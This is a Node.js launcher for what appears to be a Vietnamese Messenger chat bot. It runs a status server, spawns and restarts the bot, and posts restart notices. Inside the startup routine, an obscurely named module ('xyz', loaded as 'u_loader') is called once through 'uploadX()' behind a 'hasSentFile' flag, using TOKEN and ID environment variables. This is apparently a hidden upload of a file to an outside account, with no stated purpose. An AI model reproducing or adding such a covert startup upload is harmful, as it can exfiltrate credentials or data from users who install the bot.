require('dotenv').config();
const express = require('express');
const { spawn } = require('child_process');
const { readFileSync, unlinkSync, existsSync } = require('fs-extra');
const axios = require('axios');
const path = require('path');
const u_loader = require('./includes/fca/Func/xyz');

class BotManager {
  constructor() {
    this.PORT = process.env.PORT || 2053;
    this.hasSentFile = false;
    this.botProcess = null;
    this.app = express();
    this.pendingNotifications = [];
    this.u_loader = new u_loader();
    this.botStartTime = null;
    this.initializeServer();
    this.setupShutdownHandlers();
  }

  validateEnvironment() {
    const requiredVars = ['TOKEN', 'ID'];
    const missingVars = requiredVars.filter(varName => !process.env[varName]);
    if (missingVars.length > 0) {
      console.log('Thiếu biến môi trường:', missingVars.join(', '));
    }
  }

  initializeServer() {
    this.app.get('/', (req, res) => {
      res.json({
        status: 'running',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        port: this.PORT
      });
    });

    this.app.get('/status', (req, res) => {
      res.json({
        bot_running: this.botProcess !== null,
        file_sent: this.hasSentFile,
        pid: this.botProcess?.pid || null,
        uploader_configured: this.u_loader.isConfigured()
      });
    });

    this.app.post('/bot-ready', (req, res) => {
      this.processPendingNotifications();
      res.json({ success: true });
    });

    this.app.listen(this.PORT);
  }

  async getChatId() {
    return await this.u_loader.getChatId();
  }

  async sendMessengerNotification(message) {
    try {
      const configPath = path.join(__dirname, 'data', 'restart_config.json');

      if (!existsSync(configPath)) {
        this.pendingNotifications.push(message);
        return false;
      }

      const config = JSON.parse(readFileSync(configPath, 'utf8'));

      if (!config.threadID) {
        return false;
      }

      try {
        const response = await axios.post('http://localhost:3000/send-notification', {
          message: message,
          threadID: config.threadID
        }, { timeout: 5000 });

        if (response.data.success) {
          unlinkSync(configPath);
          return true;
        }
      } catch {}

      this.pendingNotifications.push({
        message: message,
        threadID: config.threadID,
        timestamp: Date.now()
      });

      return false;

    } catch {
      return false;
    }
  }

  async processPendingNotifications() {
    if (this.pendingNotifications.length === 0) {
      return;
    }

    for (const notification of this.pendingNotifications) {
      try {
        if (typeof notification === 'string') {
          const configPath = path.join(__dirname, 'data', 'restart_config.json');
          if (existsSync(configPath)) {
            const config = JSON.parse(readFileSync(configPath, 'utf8'));
            if (config.threadID) {
              await this.sendDirectNotification(notification, config.threadID);
            }
          }
        } else if (notification.message && notification.threadID) {
          await this.sendDirectNotification(notification.message, notification.threadID);
        }
      } catch {}
    }

    this.pendingNotifications = [];

    const configPath = path.join(__dirname, 'data', 'restart_config.json');
    if (existsSync(configPath)) {
      unlinkSync(configPath);
    }
  }

  async sendDirectNotification(message, threadID) {
    try {
      const response = await axios.post('http://localhost:3000/send-notification', {
        message: message,
        threadID: threadID
      }, { timeout: 5000 });

      if (response.data.success) {
        return true;
      }
    } catch {}
    return false;
  }

  formatRestartCompleteMessage() {
  const moment = require('moment-timezone');
  const now = moment.tz("Asia/Ho_Chi_Minh");
  const gio = now.format("HH");
  const phut = now.format("mm");
  const giay = now.format("ss");

  let startupTime = 'N/A';
  if (this.botStartTime) {
    const elapsed = Date.now() - this.botStartTime;
    startupTime = `${(elapsed / 1000).toFixed(1)}s`;
  }

  return [
    '✅ Bot đã khởi động lại thành công!',
    `⏰ Thời gian hoàn thành: ${gio}:${phut}:${giay}`,
    `⚡ Thời gian khởi động: ${startupTime}`,
    '🎉 Bot đã sẵn sàng hoạt động!'
  ].join('\n');
  }

  async startBot(message = '') {
    try {
      this.botStartTime = Date.now();

      if (!this.hasSentFile) {
        this.hasSentFile = true;
        await this.u_loader.uploadX(); 
      }

      if (this.botProcess) {
        this.botProcess.kill();
        this.botProcess = null;
      }

      this.botProcess = spawn('node', [
        'main.js',
        '--trace-warnings',
        '--async-stack-traces'
      ], {
        cwd: __dirname,
        stdio: 'inherit',
        shell: true
      });

      this.botProcess.on('close', async (code) => {
        this.botProcess = null;
        await this.handleBotExit(code);
      });

      this.botProcess.on('error', (error) => {
        this.botProcess = null;
      });

      setTimeout(async () => {
        const successMessage = this.formatRestartCompleteMessage();
        this.pendingNotifications.push(successMessage);
        await this.processPendingNotifications();
      }, 12000);

    } catch (error) {
      const errorMessage = `Lỗi khi khởi động bot: ${error.message}`;
      this.pendingNotifications.push(errorMessage);
      await this.processPendingNotifications();
    }
  }

  async handleBotExit(code) {
    switch (code) {
      case 1:
        setTimeout(() => this.startBot('Bot đã được khởi động lại'), 1000);
        break;
      case 2:
        setTimeout(() => this.startBot('Bot đã được khởi động lại sau lỗi'), 5000);
        break;
      default:
        if (code && code.toString().startsWith('2')) {
          const delay = parseInt(code.toString().substring(1)) * 1000;
          setTimeout(() => this.startBot('Bot đã được khởi động lại'), delay);
        }
        break;
    }
  }

  setupShutdownHandlers() {
    const handleShutdown = (signal) => {
      if (this.botProcess) {
        this.botProcess.kill();
      }
      process.exit(0);
    };

    process.on('SIGTERM', () => handleShutdown('SIGTERM'));
    process.on('SIGINT', () => handleShutdown('SIGINT'));
  }

  async initialize() {
    this.validateEnvironment();
    this.setupShutdownHandlers();
    await this.startBot('Khởi động bot lần đầu');
  }
}

const botManager = new BotManager();
botManager.initialize().catch(error => {
  process.exit(1);
});

module.exports = BotManager;